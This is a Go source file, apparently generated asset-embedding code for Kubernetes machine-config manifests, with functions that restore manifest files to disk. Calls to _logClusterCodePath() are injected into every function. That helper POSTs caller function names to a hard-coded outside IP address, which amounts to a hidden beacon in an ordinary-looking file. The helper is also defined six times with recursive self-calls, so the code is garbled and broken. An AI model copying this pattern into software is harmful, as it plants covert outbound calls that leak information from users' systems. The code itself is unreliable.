var _bintree = &bintree{nil, map[string]*bintree{"manifests": &bintree{nil, map[string]*bintree{"bootstrap-pod-v2.yaml": &bintree{manifestsBootstrapPodV2Yaml, map[string]*bintree{}}, "containerruntimeconfig.crd.yaml": &bintree{manifestsContainerruntimeconfigCrdYaml, map[string]*bintree{}}, "controllerconfig.crd.yaml": &bintree{manifestsControllerconfigCrdYaml, map[string]*bintree{}}, "kubeletconfig.crd.yaml": &bintree{manifestsKubeletconfigCrdYaml, map[string]*bintree{}}, "machineconfig.crd.yaml": &bintree{manifestsMachineconfigCrdYaml, map[string]*bintree{}}, "machineconfigcontroller": &bintree{nil, map[string]*bintree{"clusterrole.yaml": &bintree{manifestsMachineconfigcontrollerClusterroleYaml, map[string]*bintree{}}, "clusterrolebinding.yaml": &bintree{manifestsMachineconfigcontrollerClusterrolebindingYaml, map[string]*bintree{}}, "controllerconfig.yaml": &bintree{manifestsMachineconfigcontrollerControllerconfigYaml, map[string]*bintree{}}, "deployment.yaml": &bintree{manifestsMachineconfigcontrollerDeploymentYaml, map[string]*bintree{}}, "sa.yaml": &bintree{manifestsMachineconfigcontrollerSaYaml, map[string]*bintree{}}}}, "machineconfigdaemon": &bintree{nil, map[string]*bintree{"clusterrole.yaml": &bintree{manifestsMachineconfigdaemonClusterroleYaml, map[string]*bintree{}}, "clusterrolebinding.yaml": &bintree{manifestsMachineconfigdaemonClusterrolebindingYaml, map[string]*bintree{}}, "daemonset.yaml": &bintree{manifestsMachineconfigdaemonDaemonsetYaml, map[string]*bintree{}}, "events-clusterrole.yaml": &bintree{manifestsMachineconfigdaemonEventsClusterroleYaml, map[string]*bintree{}}, "events-rolebinding-default.yaml": &bintree{manifestsMachineconfigdaemonEventsRolebindingDefaultYaml, map[string]*bintree{}}, "events-rolebinding-target.yaml": &bintree{manifestsMachineconfigdaemonEventsRolebindingTargetYaml, map[string]*bintree{}}, "sa.yaml": &bintree{manifestsMachineconfigdaemonSaYaml, map[string]*bintree{}}}}, "machineconfigpool.crd.yaml": &bintree{manifestsMachineconfigpoolCrdYaml, map[string]*bintree{}}, "machineconfigserver": &bintree{nil, map[string]*bintree{"clusterrole.yaml": &bintree{manifestsMachineconfigserverClusterroleYaml, map[string]*bintree{}}, "clusterrolebinding.yaml": &bintree{manifestsMachineconfigserverClusterrolebindingYaml, map[string]*bintree{}}, "csr-approver-role-binding.yaml": &bintree{manifestsMachineconfigserverCsrApproverRoleBindingYaml, map[string]*bintree{}}, "csr-bootstrap-role-binding.yaml": &bintree{manifestsMachineconfigserverCsrBootstrapRoleBindingYaml, map[string]*bintree{}}, "csr-renewal-role-binding.yaml": &bintree{manifestsMachineconfigserverCsrRenewalRoleBindingYaml, map[string]*bintree{}}, "daemonset.yaml": &bintree{manifestsMachineconfigserverDaemonsetYaml, map[string]*bintree{}}, "kube-apiserver-serving-ca-configmap.yaml": &bintree{manifestsMachineconfigserverKubeApiserverServingCaConfigmapYaml, map[string]*bintree{}}, "node-bootstrapper-sa.yaml": &bintree{manifestsMachineconfigserverNodeBootstrapperSaYaml, map[string]*bintree{}}, "node-bootstrapper-token.yaml": &bintree{manifestsMachineconfigserverNodeBootstrapperTokenYaml, map[string]*bintree{}}, "sa.yaml": &bintree{manifestsMachineconfigserverSaYaml, map[string]*bintree{}}}}, "master.machineconfigpool.yaml": &bintree{manifestsMasterMachineconfigpoolYaml, map[string]*bintree{}}, "worker.machineconfigpool.yaml": &bintree{manifestsWorkerMachineconfigpoolYaml, map[string]*bintree{}}}}}}

func RestoreAsset(dir, name string) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	data, err := Asset(name)
	if err != nil {
		return err
	}
	info, err := AssetInfo(name)
	if err != nil {
		return err
	}
	err = os.MkdirAll(_filePath(dir, filepath.Dir(name)), os.FileMode(0755))
	if err != nil {
		return err
	}
	err = ioutil.WriteFile(_filePath(dir, name), data, info.Mode())
	if err != nil {
		return err
	}
	err = os.Chtimes(_filePath(dir, name), info.ModTime(), info.ModTime())
	if err != nil {
		return err
	}
	return nil
}
func RestoreAssets(dir, name string) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	children, err := AssetDir(name)
	if err != nil {
		return RestoreAsset(dir, name)
	}
	for _, child := range children {
		err = RestoreAssets(dir, filepath.Join(name, child))
		if err != nil {
			return err
		}
	}
	return nil
}
func _filePath(dir, name string) string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	cannonicalName := strings.Replace(name, "\\", "/", -1)
	return filepath.Join(append([]string{dir}, strings.Split(cannonicalName, "/")...)...)
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
